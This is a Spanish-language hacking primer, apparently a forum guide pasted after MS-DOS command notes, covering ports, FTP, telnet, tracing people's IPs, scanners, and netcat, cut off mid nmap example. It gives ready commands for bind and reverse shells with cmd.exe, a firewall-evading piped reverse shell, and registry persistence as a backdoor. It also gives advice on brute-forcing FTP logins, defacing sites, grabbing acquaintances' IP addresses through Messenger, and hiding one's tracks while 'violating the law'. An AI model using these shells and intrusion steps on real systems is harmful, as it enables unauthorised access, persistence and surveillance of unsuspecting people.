@@ -1,0 +1,1040 @@
+___________________________
+Comandos utiles del MS-DOS
+___________________________
+
+netstat _	; Informacion generica de netstat
+netstat -letra	; funcion especifica dependiendo de la letra 
+
+tasklist	; Lista de servicios activos con PiD
+taskkil /PID numero /f	; Eliminar servicio dependiendo del PID 
+
+dir		; muestra los archivos ejecutables que contiene ese directorio
+dir/a		; Lo mismo pero muestra los archivos ocultos
+
+attrib 		; Muestra los atributos de los archivos de ese directorio
+attrib -letra	; Elimina el atributo que se le especifica
+
+del nombre.extension	; Elimina el archivo que se indica "se puede borrar si no tiene atributos"
+
+md 			; Crear una carpeta
+
+
+
+Borrar la carpeta: prefetch
+
+Borrar historial de navegación por consola con: del index.dat/s
+
+Ir a herramientas administrativas en panel de control. Eliminar los registros de windows
+
+desframentar
+
+=========================
+atributos caracteristicas
+=========================
+
+• A atributo de archivo de almacenamiento.
+• R atributo de solo lectura del archivo
+• H atributo de archivo oculto
+• S atributo de archivo del sistema
+
+
+Establecer nombres de dominios de forma local.
+
+C:\windows\system32\drivers\etc\hosts
+
+__________________________________________
+Comandos basicos de hacking (curso Basico)
+__________________________________________
+
+Índice:
+1…....Introducción
+2......Organización en el mundo del hacking
+2.1...Algo de ética: Los 10 mandamientos del hacker
+3......Lista de puertos
+4…....Principales comandos del ms-dos
+5......Comandos del ms-dos con relación directa en el hacking
+6......Ftp
+7......Telnet
+8......Ping
+9......Tracert
+10....Netstat
+11…..IP
+12....Datos de la persona mediante el IP
+13…..Principales herramientas
+14....Shadow Security Scanner
+15...Netcat
+16…..Nmap
+17…..Troyanos
+18……Intrusión mediante NetBios
+19....Intrusión mediante vulnerabilidades
+20....Fuerza Bruta
+21....Programacion
+
+
+1_ Introducción
+
+Buenas, soy VortheX y escribo esta guía no sólo para los que se inicien en el hacking, que seguro les resultará de mucha utilidad, sino que también sirva de recopilación para gente más avanzados. Espero que os guste la guía, como es muy difícil acordarse de todo (xD) conforme me vaya acordando y me vayais proponiendo cosas iré añadiendo para hacerla cada vez más completa. Ah, por cierto, como no domino todos los campos de esto, (imposible dominarlo todo) he añadido información de otros sitios, en ese caso, indico el autor.
+
+Además de hacking, voy a tratar temas de cómo protegernos a nosotros mismos, de seguridad en general, y de programación, una breve introduccion (muy breve)
+
+2_Organización del mundo del hacking
+
+Bueno, esta parte es sobre todo para los que acaban de empezar, aunque la mayoría de los user ya lo sabrán, pero la guía no estaría completa sin esto.
+
+Veréis, en esto no cabe todo en el mismo saco, y según las diferentes actividades que realice la persona se pueden clasificar en los siguientes grupos:
+
+Newbie: Es un novato, con aún no muchos conocimientos generalmente, y ganas de aprender. ¡Ojo, no debe confundirse con un lammer!
+
+Hacker: Persona con muchos conocimientos informáticos, que realiza intrusiones a otros sistemas para explorar y corregir sus fallos de seguridad, o por simple curiosidad, nunca con fines destructivos.
+
+Cracker: La única diferencia respecto al hacker es que el cracker daña el sistema o lo usa para beneficiarse de él. Un cracker también puede ser una persona que rompe la seguridad del software editándolo.
+
+Lammer: Es lo más bajo en esto del hacking, son personas con poca autoestima que se dedican a creerse hackers, y lo unico que saben hacer es copiar y pegar. Suelen usar programas rastreros. Si nos topamos con alguno, lo mejor es no hacerles caso. También son lammers los que intentan “jackear” el Hotmail de la gente.
+
+Y hasta aquí la primera lección de esta guía.
+
+2.1_Algo de ética
+
+
+
+
+Bien, no podemos ir destrozando a todos los sistemas a los que entremos asi que hay una especie de reglas que seguir:
+
+I-. Nunca destroces nada intencionalmente en el ordenador que estés hackeando.
+
+II-. Modifica solo los ficheros que hagan falta para evitar tu detección y asegurar tu acceso futuro al sistema.
+
+III-. Nunca dejes tu dirección real, tu nombre o tu teléfono en ningún sistema.
+
+IV-. Ten cuidado a quien le pasas información. A ser posible no pases nada a nadie que no conozcas su voz, numero de teléfono y nombre real.
+
+VI-. Nunca hackees en ordenadores del gobierno. El gobierno puede permitirse gastar fondos en buscarte mientras que las universidades y las empresas particulares no.
+
+VII-. Se paranoico, recuerda que estas violando la ley
+
+IX-. No te preocupes en preguntar, nadie te contestara, piensa que por responderte a una pregunta, pueden cazarte a ti. al que te contesta o a ambos.
+
+Bueno, pues estan son unas reglas basicas. Ya se que faltan pero es que he borrado algunas porque estaban completamente desfasadas.
+
+
+3_ Lista de puertos
+Aquí teneis una buena lista de los puertos que podría tener abierto un pc.
+Se indican los puertos mas importantes y su servicio.
+
+Por ejemplo, el 21 es el ftp
+
+Los puertos sirven para la entrada-salida de datos de un ordenador
+
+Para intentar acceder a los puertos se hace con el comando telnet (basicamente) , que se ve más adelante, o con una utilidad que se llama netcat, que también veremos luego. Por ahora quedaros con que la maquina tiene una serie de puertos abiertos y que se puede pasar y beneficiarse de su servicio por telnet, o el netcat.
+
+Nota para newbies: Se puede saber los puertos abiertos que tiene un ordenador escaneando su web o su ip con un buen escaner, como el nmap y el shadow security scanner ( o sss) que ya veremos su funcionamiento mas adelante.
+
+
+
+echo 7/tcp
+echo 7/udp
+discard 9/tcp sink null
+discard 9/udp sink null
+systat 11/tcp
+systat 11/tcp users
+daytime 13/tcp
+daytime 13/udp
+netstat 15/tcp
+qotd 17/tcp quote
+qotd 17/udp quote
+chargen 19/tcp ttytst source
+chargen 19/udp ttytst source
+ftp-data 20/tcp
+ftp 21/tcp
+telnet 23/tcp
+smtp 25/tcp mail
+time 37/tcp timserver
+time 37/udp timserver
+rlp 39/udp resource # resource location
+name 42/tcp nameserver
+name 42/udp nameserver
+whois 43/tcp nicname # usually to sri-nic
+domain 53/tcp nameserver # name-domain server
+domain 53/udp nameserver
+nameserver 53/tcp domain # name-domain server
+nameserver 53/udp domain
+mtp 57/tcp # deprecated
+bootp 67/udp # boot program server
+tftp 69/udp
+rje 77/tcp netrjs
+finger 79/tcp
+link 87/tcp ttylink
+supdup 95/tcp
+hostnames 101/tcp hostname # usually from sri-nic
+iso-tsap 102/tcp
+dictionary 103/tcp webster
+x400 103/tcp # ISO Mail
+x400-snd 104/tcp
+csnet-ns 105/tcp
+pop 109/tcp postoffice
+pop2 109/tcp # Post Office
+pop3 110/tcp postoffice
+portmap 111/tcp
+portmap 111/udp
+sunrpc 111/tcp
+sunrpc 111/udp
+auth 113/tcp authentication
+sftp 115/tcp
+path 117/tcp
+uucp-path 117/tcp
+nntp 119/tcp usenet # Network News Transfer
+ntp 123/udp ntpd ntp # network time protocol (exp)
+nbname 137/udp
+nbdatagram 138/udp
+nbsession 139/tcp
+NeWS 144/tcp news
+sgmp 153/udp sgmp
+tcprepo 158/tcp repository # PCMAIL
+snmp 161/udp snmp
+snmp-trap 162/udp snmp
+print-srv 170/tcp # network PostScript
+vmnet 175/tcp
+load 315/udp
+vmnet0 400/tcp
+sytek 500/udp
+biff 512/udp comsat
+exec 512/tcp
+login 513/tcp
+who 513/udp whod
+shell 514/tcp cmd # no passwords used
+syslog 514/udp
+printer 515/tcp spooler # line printer spooler
+talk 517/udp
+ntalk 518/udp
+efs 520/tcp # for LucasFilm
+route 520/udp router routed
+timed 525/udp timeserver
+tempo 526/tcp newdate
+courier 530/tcp rpc
+conference 531/tcp chat
+rvd-control 531/udp MIT disk
+netnews 532/tcp readnews
+netwall 533/udp # -for emergency broadcasts
+uucp 540/tcp uucpd # uucp daemon
+klogin 543/tcp # Kerberos authenticated rlogin
+kshell 544/tcp cmd # and remote shell
+new-rwho 550/udp new-who # experimental
+remotefs 556/tcp rfs_server rfs# Brunhoff remote filesystem
+rmonitor 560/udp rmonitord # experimental
+monitor 561/udp # experimental
+garcon 600/tcp
+maitrd 601/tcp
+busboy 602/tcp
+acctdisk 707/udp
+kerberos 750/tcp kdc # Kerberos authentication--tcp
+kerberos 750/udp kdc # Kerberos authentication--udp
+kerberos_master 751/tcp # Kerberos authentication
+
+passwd_server 752/udp # Kerberos passwd server
+userreg_server 753/udp # Kerberos userreg server
+krb_prop 754/tcp # Kerberos slave propagation
+erlogin 888/tcp # Login and environment passing
+kpop 1109/tcp # Pop with Kerberos
+phone 1167/udp
+ingreslock 1524/tcp
+maze 1666/udp
+nfs 2049/udp # sun nfs
+knetd 2053/tcp # Kerberos de-multiplexor
+
+
+4_Principales comandos del ms-dos.
+
+Campaña contra el fraude Online y la Seguridad en la Red
+
+ 
+
+
+Bien, el manejo del ms-dos es fundamental en cualquier persona interesada en el hacking, ya que en la mayoría de los casos, lo que obtendremos al hackear será el shell de la víctima.
+
+Además, muchos de los programas principales de hacking funcionan en ms-dos, y como más adelante veremos, para explotar las vulnerabilidades de una máquina también lo necesitaremos.
+
+Nota para newbies: Cuando se habla de obtener el shell de un equipo lo que nos referimos es que podamos manejar el ordenador de la víctima en modo ms-dos, por eso es tan importante el conocimiento de este sistema.
+
+Bueno, pero antes de meternos “a pelo” en el ms-dos, voy a hacer una pequeña introducción:
+
+MS-DOS son las siglas de MicroSoft Disk Operating System, Sistema operativo de disco de Microsoft. es un sistema operativo comercializado por Microsoft perteneciente a la familia DOS. Fue un sistema operativo para el IBM PC que alcanzó gran difusión. Actualmente se haya integrado en toda la gama de Windows, incluído el vista y el XP. (extraido de la wikipedia)
+
+Bien, para empezar, veamos como se abre el ms-dos:
+
+Inicio-Programas-Accesorios-Símbolo del Sistema
+
+Algunos ordenadores lo tienen deshabilitado, pero también lo podemos abrir de esta manera:
+
+Inicio-Ejecutar-Command
+
+Inicio-Ejecutar –Cmd
+
+Hay veces que cuando abres por primera vez el ms-dos, es probable que se abra en pantalla completa, para que se ponga normal hay que pulsar alt+intro.
+
+Bien, ya tenemos esa pantallita negra delante de nuestras narices… ahora?
+
+Por defecto, el ms-dos se inicia metido en la carpeta C:\Documens and Settins\Vuestro nombre de usuario
+
+El primer comando que vamos a ver:
+Dir
+Ponemos dir, y apretamos enter, el comando dir vale para ver los archivos y carpetas que hay en un directorio, por defecto
+Cita:
+C:\Documens and Settins\Vuestro nombre de usuario 
+
+Segundo comando:
+CD
+Bien, el comando cd sirve para meterse en una carpeta del directorio donde estéis.
+
+Simplemente pulsar cd Nombre de la carpeta
+
+La combinación de los comandos dir y cd sirven para navegar por las carpetas del ordenador y los archivos:
+Para abrir un archivo desde el ms-dos, solo teneis que ubicaros en el directorio donde esté y escribir su nombre ( con la extensión)
+
+Ej: microsoftword.exe
+
+Ahora un ejemplo de los comandos dir y cd:
+
+Cita:
+Microsoft Windows XP [Versión 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\Pepe>dir
+El volumen de la unidad C no tiene etiqueta.
+El número de serie del volumen es: 78E0-3064
+
+Directorio de C:\Documents and Settings\Pepe
+
+05/08/2007 19:38 <DIR> .
+05/08/2007 19:38 <DIR> ..
+06/04/2007 15:25 0 AILog.txt
+09/05/2007 21:48 <DIR> Mis documentos
+11/02/2007 13:25 <DIR> WINDOWS
+10 archivos 5.292.317 bytes
+14 dirs 17.141.112.832 bytes libres 
+
+Cita:
+C:\Documents and Settings\Pepe>cd Escritorio
+
+C:\Documents and Settings\Pepe\Escritorio>dir
+El volumen de la unidad C no tiene etiqueta.
+El número de serie del volumen es: 78E0-3064
+
+Directorio de C:\Documents and Settings\Pepe\Escritorio
+
+06/08/2007 21:31 <DIR> .
+06/08/2007 21:31 <DIR> ..
+10/08/2006 15:05 466 Acceso directo a DRAE.lnk
+06/08/2007 11:57 675 Ares.lnk
+03/08/2007 11:59 675 AtomixMP3.lnk
+03/10/2006 15:38 721 Babylon.lnk
+06/08/2007 23:27 <DIR>
+06/08/2007 16:17 747 Dr. Abuse.lnk
+09/08/2006 13:04 1.475 Explorador de Windows.lnk
+15 archivos 224.559 bytes
+5 dirs 17.141.112.832 bytes libres 
+
+Cita:
+C:\Documents and Settings\Pepe\Escritorio>cd Carlos
+
+C:\Documents and Settings\Pepe\Escritorio\Carlos>dir
+El volumen de la unidad C no tiene etiqueta.
+El número de serie del volumen es: 78E0-3064
+
+Directorio de C:\Documents and Settings\Pepe\Escritorio\Carlos
+
+06/08/2007 23:27 <DIR> .
+06/08/2007 23:27 <DIR> ..
+19/07/2007 15:49 3.779.414 analizadores_de_archivos.rar
+06/08/2007 11:57 2.017.091 aresregular209_installer.exe
+19/07/2007 15:10 420.352 Assembler.doc
+08/07/2007 18:05 <DIR> usb
+31 archivos 49.346.341 bytes
+5 dirs 17.141.112.832 bytes libres 
+
+Cita:
+C:\Documents and Settings\Pepe\Escritorio\Carlos> 
+
+5_Comandos del ms-dos con relación directa en el hacking
+
+Bien estos comandos son útiles una vez tengamos el shell del otro pc ( si es que hackeamos para obtener la shell) pero hay otros que nos ayudan directamente a hackear y son IMPRESCINDIBLES.
+
+6_FTP
+
+Este comando es uno de los más importantes, ya que por ello se pueden acceder a servidores o a los archivos de las web y modificarlas (deface)
+
+Este comando se usa de la siguiente manera:
+
+Abrimos el ms-dos.
+
+C:\Documents and Settings\Pepe>
+
+Escribimos ftp
+
+C:\Documents and Settings\Pepe>ftp
+
+Ahora a enter xD
+
+ftp>
+
+Bien, ya estamos en el ftp
+
+Ahora sería de la siguiente manera:
+
+ftp> open ipdelamaquina o pagina web
+
+Ejemplo:
+
+ftp> open 302 Moved
+
+Una vez llegados a ese punto, sería meter el user y la contraseña del pc y ya estaríamos dentro.
+
+Las contraseñas del ftp se pueden obtener de varias maneras, por fuerza bruta, probando contraseñas y user que tengan que ver con el usuario, tambien se puede puede intentar poniendo user y pass que vienen por defecto, aunque ese truco es algo viejo.
+
+Nota: Solo las webs suelen tener abierto el puerto ftp, lo digo por si le pillais la ip de algun amiguete, que sepais que es normal que de error.
+
+El puerto del ftp es el 21
+
+El ftp también se puede hacer haciendo telnet a ese puerto (21) , telnet será el siguiente comando que veamos.
+
+7_Telnet
+
+Telnet es el comando más importante, sirve para conectarse a cualquier puerto de una máquina o al puerto por defecto el 23. Esto esta muy desfasado, no hay casi pcs que lo tengan abierto, pero sin saber esto no vas a ningun lado, es basico
+
+Por telnet podemos manejar el otro ordenador en modo ms-dos, es decir, que podemos obtener el shell.
+
+Para hacer telnet:
+Abrimos el ms-dos
+Cita:
+C:\Documents and Settings\Pepe>telnet ipdelamaquina Puerto 
+También podemos dejar el campo del Puerto vacío solo poniendo la telnet y la ip, y se conectaría por defecto al puerto 23, pero hoy en día ya no hay casi ningun ordendor con ese puerto abierto.
+
+Una vez conectados, según que puerto, claro, te pedira el user y el pass, que también lo podemos conseguir por la fuerza bruta.
+
+8_Ping
+El comando ping sirve para saber si un servidor está activo.
+También es útil porque podemos saber la ip de un sitio web.
+
+Como hacer ping:
+
+C:\Documents and Settings\Pepe>ping ipopaginaweb
+
+Ejemplo:
+Cita:
+C:\Documents and Settings\Pepe>ping 302 Moved
+
+Haciendo ping a 302 Moved [66.249.93.99] con 32 bytes de datos:
+
+Respuesta desde 66.249.93.99: bytes=32 tiempo=112ms TTL=240
+Respuesta desde 66.249.93.99: bytes=32 tiempo=104ms TTL=240
+Respuesta desde 66.249.93.99: bytes=32 tiempo=367ms TTL=240
+Respuesta desde 66.249.93.99: bytes=32 tiempo=154ms TTL=240
+
+Estadísticas de ping para 66.249.93.99:
+Paquetes: enviados = 4, recibidos = 4, perdidos = 0
+(0% perdidos),
+Tiempos aproximados de ida y vuelta en milisegundos:
+Mínimo = 104ms, Máximo = 367ms, Media = 184ms 
+
+
+En este caso el servidor está activo, ya que ningun paquete de datos se ha perdido.
+Como veis, tambien hemos averiguado la ip del sitio web al que le haciamos el ping.
+(66.249.93.99)
+
+9_Tracert
+Este comando es muy util, sirve para saber por que ordenadores pasa una petición nuestra antes de llegar al pc de destino: pe, google.
+
+Es asi:
+
+Cita:
+C:\Documents and Settings\Pepe>tracert ip 
+
+Después ya saldrían por los ordenadores por los que ha pasado
+
+Puede parecer que no es mucho, pero con este metodo se puede descubrir si un ordenador se protege con un Proxy.
+
+Mediante el tracert podemos saber tambien donde tiene contratada la cuenta ( por ejemplo, telefonica)
+
+10_Netstat
+Sirve para ver las conexiones establecidas
+Es:
+Netstat –na
+
+Con esto aparecerian las ips que estan conectadas a nuestro ordenador ( el ares, las web)
+
+Con este comando hay un metodo para sacar la ip de alguien por el msn, lo explicaré mas adelante.
+
+11_IP
+
+
+
+Obtener el ip de el ordenador a intentar hackear es el primer paso para lograr nuestro objetivo, ya que con ella podemos escanear su ordenador para ver los puertos que tiene abiertos y sus vulnerabilidades ( ya lo veremos mas adelante)
+Como ya sabéis, la ip de una pagina web se puede obtener con el comando ping.
+
+Otro método para averiguar la ip por correo electrónico es abrir el Hotmail, le das a opciones, opciones de la pantalla y allí seleccionas el encabezado de correo o algo así avanzado. Así cuando abras un mensaje, arriba saldrá la ip, entre otras, del que te lo envió.
+
+Por el Messenger también se puede averiguar la ip de una persona.
+
+Solo tienes que enviarle un archivo, y mientras se pasa le das al ms-dos, escribes netstat –na y te saldrán muchas ips, pero no te costará reconocer la de tu amigo
+
+Para este truco tienes que tener todas las ventanas de Internet cerradas, si no no va a funcionar.
+
+También existe un programa para automatizar esto, se llama private ip.
+
+Bueno, ya sabemos como sacar una IP, pero ahora veamos un poco de teoría.
+La dirección ip es el numero que identifica a un ordenador en Internet, simplemente.
+
+Pueden ser dinámicas, si cada vez que se enciende y se apaga el router cambia, o estática, si la ip siempre es la misma.
+
+También la IP puede ser interna o pública, la que nos interesa para hackear es la pública, que es del tipo 80.335.26.21 y parecidas, que se saca con los métodos anteriores.
+
+La ip interna de un ordenador nos vale para hackear si los pcs estan conectados a una red local, como una biblioteca, un instituto o una cybersala.
+
+Esta IP se puede obtener abriendo el ms-dos y escribiendo ipconfig.
+
+
+12_Sacando información de la persona con la IP
+
+
+
+Con una ip podemos averiguar mucha más información de la que realmente creemos, localizar el lugar donde está ubicado ese ordenador y muchos datos más
+
+Nota importante: Este texto no está copiado pero está inspirado en una pequeña guía que hizo Rakion en el portalhacker hace un tiempecito…
+
+Bien, lo primero que vamos a hacer va a ser localizar la IP en cuestión.
+Para esto tenemos una página magnifica, Asociación de Internautas
+
+Solo metes la IP y le das a localizar, facil no?
+
+Que no sólo dice donde está ubicada, sino que también lo indica en un mapa
+
+Pero eso no es todo
+
+Podemos averiguar muchas cosas como datos del servidor con un whois.
+Para ello nos metemos a esta página:
+
+NIC M&eacute;xico - Whois de IP
+
+Allí metemos la dirección IP, luego a buscar y nos saldrá un montón de datos útiles.
+
+Esto puede parecer que no es importante para hackear, pero a partir del nombre y esas cosas se pueden averiguar users, y cuantos mas datos se tengan del ordenador apuntados en un .txt muchísimo mejor.
+ 
+
+The Following 9 Users Say Thank You to matasali For This Useful Post: 
+amantedelavida (13-09-2008), BALLBREAKER  (19-05-2008), capito (16-05-2008), Freddie_Mercury (25-02-2008), laviciosa (10-01-2008), Luismineytor (04-01-2008), Luis_Felipe (21-02-2008), same20 (07-01-2008), ZeREs_001 (20-04-2008)
+
+  #2   
+ 04-01-2008, 00:36 
+
+ 
+matasali  
+Animal
+
+ 
+    Registrado: Jul 2005
+Posts: 2.200 
+FoquiMoney: 10.281 
+Gracias dadas: 137
+Agradecido 272 vez en 76 posts 
+    
+
+
+Re: Guia de como hackear un pagina web (para principiantes) 
+________________________________________
+13_Principales herramientas
+
+
+
+Faltan algunas, pero ya las ireis descubriendo segun las necesidades que tengáis...
+
+Aquí teneis una lista con las herramientas principales y como se usan:
+
+14_Shadow Security Scanner ( o SSS)
+
+
+Aqui teneis una captura de el SSS
+
+Esta herramienta es la primera de la lista, es el escaner de vulnerabilidades y de puertos más usado y el mejor (con permiso del AcunetiX, que es parecido pero me parece mejor),. Lo malo es que el programa no es gratis xD a si que os lo tendréis que bajar… o pagar $$$$
+
+Bien, una vez instalado sale la pantalla. Es muy intuitivo.
+
+Le damos a New Session
+
+Complete Scan, y ya vamos siguiendo los pasos, que serían meter la ip una vez dado a finalizar al acabar el proceso, para que empieze a escanear, seleccionamos la ip o la web y le damos a start scan.
+
+Una vez finalizado el escaner, a la izquierda tendremos una lista de los puertos abiertos, además de mucha más información.
+
+Si pinchamos en la pestaña Vulnerabilities nos saldrán una lista de sitios por donde podremos pasar. La importancia de las vulnerabilidades se miden por colores, las azules no tienen mucha importancia, y las rojas son críticas, que son con las que vamos a trabajar principalmente.
+
+Si pinchamos en una vulnerabilidad, abajo del todo hay un número, si pinchamos nos llevará a un sitio web donde nos dirá a que afecta la vulnerabilidad, una descripción e incluso el exploit para poder aprovecharnos de esa vunerabilidad.
+
+Nota para newbies: Un exploit es un código, que una vez compilado en su lenguaje de programación en el que esté escrito ( normalmente c, esto se puede ver fijandose el la extensión que tiene el codigo del exploit) se abre con el ms-dos y se siguen las instrucciones para conseguir acceso a la maquina remota.
+
+15_Netcat
+
+
+ 
+
+
+El netcat es una utilidad que sirve principalmente para escanear o ver el trafico que pasa por un puerto (sniffer), tambien vale para hacer un Chat, muchísimas cosas, tambien puedes obtener el shell de otro ordenador con esta herramienta.
+
+Funcionamiento:
+Bien, abrimos el .exe que nos viene y nos sale una pantalla parecida a la del ms-dos y pone cmd line:
+
+Nota: Se manejar el netcat, pero ni mucho menos estoy informado de todas las cosas que se pueden hacer con el, asi que he incluído este texto, pero no es mío, que conste
+
+Introducción:
+
+El netcat para win32, es un programa que funciona en ms-dos, sin entorno gráfico, y sirve para realizar conexiones de casi cualquier tipo en tcp y udp.
+Conviene guardar nc.exe en %windir%/command (si vas a usar nc en una versión de win anterior a winme) o en %windir%/system32 (si vas a usar nc en una versión posterior a winnt). Esto es xq en esas carpetas se guardan los comandos externos del ms-dos y de esta forma vamos a poder usar el nc como un comando externo más. La ventaja de esto es q no vamos a tener q ubicar la línea de comandos en la carpeta donde está guardado el nc cada vez que lo keramos usar, sino que lo vamos a poder usar dsd cualquier carpeta.
+Para ver la ayuda incluida en el nc tipeamos nc -h.
+
+
+Principales modos de uso:
+
+• client
+Podemos usar el nc para conectarnos a una maquina por cualquier puerto siempre que éste este abierto.
+La sintaxis básica es:
+{opciones} [ip/hostname] [puerto]
+Las opciones, como su nombre lo indica, son opcionales, por lo que si yo tipeara en mi linea de comandos:
+201.234.131.38 23
+Se conectaría a 201.234.131.38 (fiar argentina) por el puerto 23 (telnet).
+Es muy recomendable usar siempre la opción -vv para que el nc nos de información sobre el estado de la conexión. Las opciones siempre van antes de la direccion ip o el hostname y el puerto (en ese orden), por lo que la nueva sintaxis nos kedaría:
+-vv {opciones} [ip/hostname] [puerto]
+Las opciones que se pueden combinar con este uso son:
+-d (detach from console) modo oculto, en segundo plano, la conexión sigue aunke c cierre el ms-dos
+-n (numeric ip only) c usa cuando c dá una ip en vez de un hostname y no keres q el nc use dns para averiguar el hostname
+-o (hex dump of traffic) guarda todo el trafico de una conexión en un archivo hexadecimal
+-p (local port number) elegís el puerto local para la conexión
+-r (randomize local and remote ports) elige al azar los puertos no especificados.
+-s (local source address) dirección local
+-i (delay interval for lines sent) tiempo de espera entre línea y línea enviada
+-u (udp mode) realiza conexiones en puertos udp
+-v (verbose) modo detallado, usar dos veces para que sea más detallado
+-w (wait) tiempo en segundos en los que la conexión se mantendrá sin que ninguna de las partes transfiera datos, x ej: si pongo -w 3 y yo o el server dejamos de transmitir datos durante 3 segundos, la conexión termina.
+
+• server
+Podemos usar el nc para poner un puerto a la escucha y recibir conexiones entrantes.
+La sintaxis básica es:
+-l -p {opciones} [puerto]
+Donde [puerto] es el número de puerto que se kiere poner a la escucha.
+La opción -l puede usarse en mayúscula -L si se desea que luego de finalizada la conexión, el nc siga escuchando en el mismo puerto con las mismas opciones. De otra forma, al finalizar la conexión, el nc se cerraría
+Opciones adicionales:
+-d (detach from console) funciona en segundo plano, independientemente del ms-dos
+-e (inbound program to exec) ejecuta un programa al conectarse un cliente.
+-i (delay interval for lines sent) tiempo de espera entre línea y línea enviada.
+-o (hex dump of traffic) guarda todo el trafico de una conexión en un archivo hexadecimal.
+-r (randomize local and remote ports) elige al azar los puertos no especificados.
+-s (local source address) dirección local
+-u (udp mode) realiza conexiones con puertos udp
+-v (verbose) modo detallado, usar dos veces para que sea más detallado
+-w (wait) tiempo en segundos en los que la conexión se mantendrá sin que ninguna de las partes transfiera datos, x ej: si pongo -w 3 y yo o el server dejamos de transmitir datos durante 3 segundos, la conexión termina.
+
+• port scan
+Podemos usar el nc para comprobar que puertos tiene abiertos una máquina.
+La sintaxis básica sería:
+-z {opciones} [ip/hostname] [puerto/s]
+Opciones adicionales:
+-d (detach from console) funciona en segundo plano, independientemente del ms-dos
+-i (delay interval for lines sent) tiempo de espera entre línea y línea enviada.
+-n (numeric ip only) c usa cuando c dá una ip en vez de un hostname y no keres q el nc resuelva el hostname
+-o (hex dump of traffic) guarda todo el trafico de una conexión en un archivo en hexadecimal.
+-s (local source address) dirección local
+-u (udp mode) realiza conexiones con puertos udp
+-v (verbose) modo detallado, usar dos veces para que sea más detallado
+-w (wait) tiempo en segundos en los que la conexión se mantendrá sin que ninguna de las partes transfiera datos, x ej: si pongo -w 3 y yo o el server dejamos de transmitir datos durante 3 segundos, la conexión termina.
+Los puertos pueden especificarse individualmente, x rangos (inclusivos) o ambos en cualquier orden.
+
+A partir de ésto pueden inventar infinitos usos combinando el nc con otros programas y opciones propias del ms-dos. Además de varias opciones del nc que no expuse acá xq no estoy seguro de poder explicarlas.
+
+
+Ejémplos prácticos:
+
+• para conectarse a un servidor pop3
+capital.cf.rffdc.edu.ar 110
+
+• para conectarse a un servidor smpt en modo detallado:
+-vv capital.cf.rffdc.edu.ar 25
+
+• para conectarse a un servidor ftp en modo detallado dsd el puerto local 1337:
+-vv -p 1337 capital.cf.rffdc.edu.ar 21
+-vv -p 1337 ftp.microsoft.com.ar 21
+-vv -p 1337 ftp.ar.geocities.com 21
+-vv -p 1337 cablemodem.fibertel.com.ar 21
+o x el cliente ftp de ms: ftp [ip/hostname]
+
+• para conectarse a un servidor telnet aprovechando la opción -t (answer telnet negociation)
+-vv -t freeshell.org 23
+-vv -t capital.cf.rffdc.edu.ar 23
+o x el cliente telnet de ms: telnet [ip/hostname]
+
+• para conectarse a un servidor web en modo detallado dsd el puerto 2236 guardando el trafico en un archivo hexadecimal llamado wdeah.txt:
+-vv -p 2236 -o wdeah.txt www.google.com.ar 80
+-vv -p 2236 -o wdeah.txt www.desertwolf.com.ar 80
+-vv -p 2236 -o wdeah.txt www.fotolog.com 80
+o x ms iexplorer en dirección: [ip/host]
+
+• escanear puertos individualmente:
+-z www.ieslenguasvivasjrf.esc.edu.ar 21 23 20 22 80 110
+
+• escanear puertos por rangos inclusivos:
+-z 200.123.160.225 20-23 137-139
+
+• escanear por puertos tanto específicos como por rangos:
+-z www.ieslenguasvivasjrf.esc.edu.ar 137-139 80 110
+
+• shell directa
+Mediante este comando en un windows posterior a winme
+-l -p 2236 -e cmd.exe -d
+A cualquiera que se conectase por el puerto 2236 mediante nc o telnet, le aparecería una shell equivalente al cmd.exe de la maquina en la que se ejecutó el comando. Lo mismo ocurriría en un windows anterior a winme reemplazando cmd.exe por command.com en el comando anterior.
+
+• shell inversa
+Esta técnica es una variación de la primera, con la diferencia que en esta la máquina que proporciona la shell se conecta a la otra pudiendo de ésta forma saltar algunos routers y firewalls. Ideal para maquinas dentro de una red.
+Se ejecuta el siguiente comando en una maquina para ponerla a la escucha de conexiones por el puerto 2236:
+-vv -L -p 2236
+Luego, se ejecuta el siguiente comando en la maquina que va a proporcionar la shell para que se conecte a la primera:
+-d -e [cmd.exe/command.com] [ip/hostname primera maq] 2236
+
+• shell inversa distribuida
+Está técnica es la más silenciosa y efectiva de todas, en ésta se realizan dos conexiones inversas (una para enviar información y otra para recibirla) usando los puertos 25 y 80 que el firewall del win xp sp2 no filtra por tenerlos habilitados por default para el envío (25 smpt) y recibo (80 http) de información.
+Para esto abrimos dos ventanas en la maquina que recibirá la shell en las que ponemos:
+-vv -l -p 80
+y
+-vv -l -p 25
+Respectivamente, de manera que escuche conexiones por los puertos 80 y 25. Luego, en la máquina q proporcionará la shell ponemos:
+nc [ip/hostname maq escucha] 80 | cmd.exe | nc [ip/hostname maq escucha] 25
+Una vez realizada la conexión, se envían los comandos desde la ventana que escucha por el puerto 80 y se reciben los resultados en la ventana que escucha por el puerto 25.
+
+• backdoor
+Para dejar al nc funcionando a modo de backdoor se pueden utilizar diversos métodos, tales como agregar un valor alfanumérico en el registro de win en la clave hkey_local_machine\software\microsoft\windows\curr entversion\run, o agregar un línea al autoexec.bat o al win.ini, o utilizar el comando at, el programador de tareas, etc.
+
+• chat peer to peer
+Se puede crear un simple chat mediante nc entre dos personas escribiendo una de ellas (server) éste comando:
+-l -p 1337
+y la otra (client) éste otro:
+nc [ip/hostname de la maq dnd c ejecuto el comando anterior] 1337
+La primera persona abriría el puerto 1337 para recibir conecciónes y la segunda se conectaría a su maquina por el puerto que la primera persona abrió por lo que realizarían una conexión directa puerto a puerto.
+Luego, lo que una de las personas escribiese en su nc aparecería en el nc del otro y viceversa.
+
+El autor de este texto es Franco Pyrih
+
+16_Nmap
+
+
+ 
+
+Cita:
+El nmap es un escáner, tambien de los más usados en la actualidad, por sus muchas opciones y porque da muchísima información sobre el servidor que escanees, sus puertos, ect. 
+
+Funcionamiento básico:
+
+El primer paso es obtener Nmap lo puede encontrar en http://www.insecure.org, existen versiones para Windows UNIX y Linux entre otros. Si esta montando el sistema en Windows requiere WinPcap en Unix requerirá Libpcap. Para el caso de Windows requerirá reiniciar el sistema para garantizar que se cargue el controlador del la tarjeta. Una vez ha instalado la herramienta es hora de utilizarla, el primer scan puede ser relativamente simple así:
+nmap 192.168.1.1
+Esta salida es la que podrá ver en sus sistema:
+$ nmap 192.168.1.254
+Starting nmap 3.81 ( http://www.insecure.org/nmap/ ) at 2005-06-05 15:08 EDT
+Interesting ports on 192.168.1.254:
+(The 1661 ports scanned but not shown below are in state: filtered)
+PORT STATE SERVICE
+21/tcp open ftp
+80/tcp open http
